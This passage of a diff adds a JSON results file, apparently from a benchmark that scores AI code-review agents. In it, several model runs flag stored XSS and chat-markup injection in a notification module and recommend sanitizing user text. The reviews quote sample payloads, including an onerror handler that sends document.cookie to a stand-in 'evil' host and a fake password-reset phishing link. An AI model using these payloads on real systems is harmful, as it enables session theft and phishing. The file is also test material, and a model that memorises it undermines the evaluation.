+          "rationale": "Confirmed: mentionInbox interpolates m.authorName and m.body directly into the `html` field with no sanitization, while the sibling mentionEmail passes both through stripInlineMarkup. clients.ts line 11 explicitly documents `html` as \"rendered as is in the web app's notification inbox\", and sanitize.ts states every outbound sink must pass user text through stripInlineMarkup. Since authorName/body are user-controlled mention content, this yields stored XSS in the inbox. The only PreviousReviewDecision concerns CSV formula escaping in src/reports/export.ts, a different file/operation, so this is not a repeat. The root cause and failure path hold.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup|rendered as is|mentionEmail"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates raw user-controlled `m.authorName` and `m.body` into the chat `text` field, which clients.ts documents as interpreting chat markup (`<url|label>` links, `<!channel>` pings everyone). WHY: an attacker can embed `<!channel>` to mass-ping the whole channel or a forged link like `<https://evil.example|Reset password>` to phish recipients — mentionEmail sanitizes the same fields via stripInlineMarkup, and sanitize.ts explicitly calls out `<!channel>` and fake reset-password links as the exact attack this guard blocks. HOW: wrap both fields with stripInlineMarkup before building the text.",
+          "keep": true,
+          "rationale": "mentionChat at lines 20-24 interpolates raw m.authorName and m.body into the chat text field, while mentionEmail (lines 15-16) sanitizes the same fields via stripInlineMarkup. sanitize.ts:2-3 explicitly names '<!channel> mentions' and '<https://evil.example|Reset password> links' as the attack stripInlineMarkup blocks, and clients.ts:6 documents that chat text interprets <url|label> links and <!channel> pings. The unsanitized interpolation therefore allows mass-pinging and forged-link phishing — a concrete, reachable bug. The prior review decision concerns CSV formula escaping in src/reports/export.ts, a different problem in a different operation.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup|<!channel>|sanitize",
+                "path": "src/notifications"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "sandboxCalls": 22,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "A mention author name or body containing markup such as `<img src=x onerror=...>` is stored and rendered verbatim in the notification inbox, giving stored XSS since `clients.ts` documents the `html` field as rendered as-is. Wrap both `m.authorName` and `m.body` with `stripInlineMarkup`, as the sibling `mentionEmail` already does and `sanitize.ts` requires for every outbound sink."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "An attacker can embed `<!channel>` to mass-ping the whole channel or a forged link like `<https://evil.example|Reset password>` to phish recipients, since `clients.ts` documents the chat `text` field as interpreting chat markup. Wrap both `m.authorName` and `m.body` with `stripInlineMarkup` before building the text, matching `mentionEmail` and the guard `sanitize.ts` describes for these exact attacks."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P37-markup-strip-new-sinks-control",
+      "family": "control",
+      "sandbox": "alive",
+      "ms": 151999,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates the user-controlled m.authorName and m.body into the chat `text` without stripping chat markup. WHY: ChatClient.post documents that `text` uses chat markup where `<!channel>` pings everyone and `<url|label>` renders a link, so a malicious display name/body can mass-ping a channel or render an attacker-controlled phishing link; sanitize.ts requires every outbound sink to strip markup first (mentionEmail does). HOW: apply stripInlineMarkup to both values before building the message text.",
+          "keep": true,
+          "rationale": "Confirmed: clients.ts:6 documents that ChatClient.post `text` uses chat markup where <url|label> renders a link and <!channel> pings everyone. mentions.ts:22 interpolates user-controlled m.authorName and m.body raw into that text, while mentionEmail (lines 15-16) applies stripInlineMarkup and sanitize.ts:3 states every outbound sink must pass user text through stripInlineMarkup first. The omission is real and reachable, enabling mass-ping/phishing-link injection. The PreviousReviewDecision (round-a-other-1) concerns CSV formula escaping in reports/export.ts — a different file, rule, and failure, so it does not resolve this.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup",
+                "path": "src"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "path": "src/notifications",
+                "pattern": "post\\(|ChatClient|text",
+                "glob": "clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates the user-controlled m.authorName and m.body directly into the inbox `html` field without passing them through stripInlineMarkup. WHY: InboxStore documents that `html` is 'rendered as is in the web app's notification inbox', so a display name or comment body containing `<img src=x onerror=...>` or `<script>` executes as stored XSS for the recipient, and sanitize.ts explicitly states every outbound sink must strip markup first (mentionEmail already does). HOW: wrap both values: `html: \\`<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}\\``.",
+          "keep": true,
+          "rationale": "Confirmed. mentionInbox (src/notifications/mentions.ts:27-30) writes m.authorName and m.body directly into the `html` field, whereas the sibling mentionEmail (lines 15-16) passes both through stripInlineMarkup. sanitize.ts:3 states every outbound sink must strip user text first, and clients.ts:11 documents InboxStore `html` is \"rendered as is in the web app's notification inbox\". A display name/body containing `<img src=x onerror=...>` or `<script>` would therefore execute as stored XSS. The suggested fix (wrapping both values in stripInlineMarkup) is valid. The earlier review decision concerns CSV formula injection in src/reports/export.ts — a different problem in a different operation, not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup|mentionInbox|mentionEmail"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "sandboxCalls": 23,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 27,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "In `mentionInbox`, user-controlled `m.authorName` and `m.body` are interpolated directly into the inbox `html` field without `stripInlineMarkup`, and because `InboxStore` documents that `html` is rendered as-is in the web app's notification inbox, a display name or comment body containing `<img src=x onerror=...>` or `<script>` executes as stored XSS for the recipient, while `sanitize.ts` requires every outbound sink to strip markup first as `mentionEmail` does. Pass both values through `stripInlineMarkup` when building the `html` field."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "In `mentionChat`, user-controlled `m.authorName` and `m.body` are interpolated into chat `text` without `stripInlineMarkup`, and because `ChatClient.post` documents that `text` uses chat markup where `<!channel>` pings everyone and `<url|label>` renders a link, a malicious display name or body can mass-ping a channel or render an attacker-controlled phishing link, while `sanitize.ts` requires every outbound sink to strip markup first as `mentionEmail` does. Apply `stripInlineMarkup` to both values before building the message text."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P37-markup-strip-new-sinks-control",
+      "family": "control",
+      "sandbox": "alive",
+      "ms": 139759,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat writes the user-controlled m.authorName and m.body straight into chat markup without stripInlineMarkup, unlike mentionEmail. WHY: clients.ts documents that chat text interprets markup (`<url|label>` renders a link, `<!channel>` pings everyone), so a body containing `<!channel>` notifies the whole channel and `<https://evil.example|Reset password>` injects a phishing link attributed to the app — exactly the abuse sanitize.ts says every sink must prevent. HOW: apply stripInlineMarkup to both fields before composing text, e.g. `text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>``.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat interpolates the user-controlled m.authorName and m.body directly into chat markup, while the sibling mentionEmail applies stripInlineMarkup to the same fields. clients.ts explicitly documents that ChatClient.post text interprets markup (<url|label> links, <!channel> pings), and sanitize.ts names exactly these abuse vectors (channel mention, phishing link) as things every outbound sink must strip. No guard upstream sanitizes these fields before use. The only prior review decision concerns CSV escaping in export.ts, a different problem, so this is not a repeat. Root cause and failure path are concrete and reachable.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates the user-controlled m.authorName and m.body directly into the inbox `html` without the stripInlineMarkup applied by every other outbound sink. WHY: clients.ts documents this html as \"rendered as is in the web app's notification inbox\", so a display name or comment body such as `<img src=x onerror=fetch('//evil/'+document.cookie)>` executes as stored XSS in the recipient's web app. HOW: sanitize both fields before building the html: `html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}``.",
+          "keep": true,
+          "rationale": "Confirmed: mentions.ts:28 injects user-controlled m.authorName and m.body into html with no sanitization, while clients.ts:11 states the html is rendered as-is in the web app's inbox (stored XSS). Every other outbound sink (mentionEmail line 16) and the sanitize module's own contract use stripInlineMarkup; mentionInbox uniquely omits it. The only previous decision concerns CSV injection in export.ts, a different file/operation, so this is not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup",
+                "namesOnly": true
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "rendered as is|notification inbox|html:",
+                "glob": "*.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "endLine": 30,
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "endLine": 20,
+                "path": "src/notifications/clients.ts",
+                "startLine": 1
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "sandboxCalls": 13,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `mentionInbox` interpolates user-controlled `m.authorName` and `m.body` directly into the inbox `html` without the `stripInlineMarkup` applied by every other outbound sink, and `clients.ts` documents this `html` as being rendered as is in the web app's notification inbox, a display name or comment body such as `<img src=x onerror=fetch('//evil/'+document.cookie)>` can execute as stored XSS in the recipient's web app. Sanitize both fields with `stripInlineMarkup` before building the `html`."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `mentionChat` writes user-controlled `m.authorName` and `m.body` straight into chat markup without `stripInlineMarkup`, unlike `mentionEmail`, and `clients.ts` documents that chat text interprets markup such as `<url|label>` and `<!channel>`, a body containing `<!channel>` notifies the whole channel and `<https://evil.example|Reset password>` injects a phishing link attributed to the app, exactly the abuse `sanitize.ts` says every sink must prevent. Apply `stripInlineMarkup` to both fields before composing the text."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P37-markup-strip-new-sinks-control",
+      "family": "control",
+      "sandbox": "alive",
+      "ms": 143226,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates the user-controlled m.authorName and m.body directly into the inbox item's html, which clients.ts documents as 'rendered as is in the web app's notification inbox'. WHY: a mention author can set their display name or comment body to `<img src=x onerror=...>` or `<script>...</script>`, producing stored XSS that executes in every recipient's web app session; this bypasses the sanitize.ts invariant that 'Every outbound sink passes user text through stripInlineMarkup first'. HOW: wrap both values in stripInlineMarkup, as mentionEmail already does.",
+          "keep": true,
+          "rationale": "Confirmed: src/notifications/mentions.ts:28 interpolates m.authorName and m.body raw into the inbox item's html, while clients.ts:11 documents that html is 'rendered as is in the web app's notification inbox'. sanitize.ts:3 states the invariant that every outbound sink passes user text through stripInlineMarkup, and mentionEmail (lines 15-16) does exactly that. mentionInbox omits it, so a mention author's display name or comment body containing e.g. <img src=x onerror=...> becomes stored XSS in every recipient's web session. The root cause is factually accurate and the failure path is reachable. The only PreviousReviewDecision concerns CSV formula injection in reports/export.ts — a different operation and failure, not a repeat of this issue.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates the user-controlled m.authorName and m.body directly into the chat message text, which clients.ts documents as chat markup where '<!channel> pings everyone' and '<url|label>' renders a link. WHY: an attacker-controlled name or body can inject `<!channel>` to mass-ping the channel, or a spoofed link such as `<https://evil.example|Reset password>` that renders as a trusted anchor, and can break out of the `<...>` link markup with `>`/`|`; this bypasses the sanitize.ts invariant that every outbound sink runs user text through stripInlineMarkup. HOW: apply stripInlineMarkup to m.authorName and m.body before building the text, as mentionEmail does.",
+          "keep": true,
+          "rationale": "Confirmed in source: mentionChat (mentions.ts:22) builds `text` from raw m.authorName and m.body with no stripInlineMarkup, unlike mentionEmail (lines 15-16) which sanitizes both. sanitize.ts:3 documents the invariant that every outbound sink passes user text through stripInlineMarkup, and clients.ts:6 documents that post text is interpreted as chat markup (<url|label> renders a link, <!channel> pings everyone), so injected markup genuinely renders. The root cause and failure path are factually correct and reachable. The only prior review decision concerns CSV formula injection in src/reports/export.ts — a different file, sink, and failure — so this is not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 80
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup|sanitize",
+                "path": "src/notifications"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "endLine": 30,
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "pattern": "channel|markup|link|post"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "sandboxCalls": 24,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `mentionInbox` interpolates the user-controlled `m.authorName` and `m.body` directly into inbox HTML that `clients.ts` documents as rendered as-is, a mention author can set their display name or body to <img src=x onerror=...> or <script>...</script>, producing stored XSS that executes in every recipient's web app session and bypassing the `sanitize.ts` invariant that every outbound sink passes user text through `stripInlineMarkup` first. Wrap both values in `stripInlineMarkup`, as `mentionEmail` already does."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `mentionChat` interpolates the user-controlled `m.authorName` and `m.body` directly into chat message text where <!channel> pings everyone and <url|label> renders a link, an attacker can mass-ping the channel or inject a spoofed link such as <https://evil.example|Reset password> that renders as a trusted anchor, breaking out of the <...> markup with > or | and bypassing the `sanitize.ts` invariant that every outbound sink runs user text through `stripInlineMarkup`. Apply `stripInlineMarkup` to `m.authorName` and `m.body` before building the text, as `mentionEmail` does."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    }
+  ]
+}
